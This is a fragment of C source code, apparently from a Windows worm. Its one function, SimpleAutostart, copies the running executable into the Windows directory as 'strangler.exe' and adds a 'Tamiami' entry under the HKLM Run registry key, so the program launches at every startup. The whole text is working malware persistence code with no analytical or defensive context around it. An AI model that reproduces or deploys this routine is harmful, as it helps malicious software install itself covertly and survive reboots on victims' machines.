   void SimpleAutostart(void)
   {
       char        InstallName[] = "\\strangler.exe";
       char        InstallReg[] = "Tamiami";
       char        WormPath[MAX_PATH];
       char        WinDir[MAX_PATH];
       HKEY        RegHandle;

       if(GetModuleFileName(0, WormPath, sizeof(WormPath)) != 0)
       {
           if(GetWindowsDirectory(WinDir, sizeof(WinDir)) != 0)
           {
               lstrcat(WinDir, InstallName);

               if(CopyFile(WormPath, WinDir, 0) != 0)
               {
                   if(RegOpenKeyEx(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &RegHandle) == ERROR_SUCCESS)
                   {
                       RegSetValueEx(RegHandle, InstallReg, 0, REG_SZ, (BYTE *)WinDir, lstrlen(WinDir));
                       RegCloseKey(RegHandle);
                   }
               }
           }
       }

       return;
   }
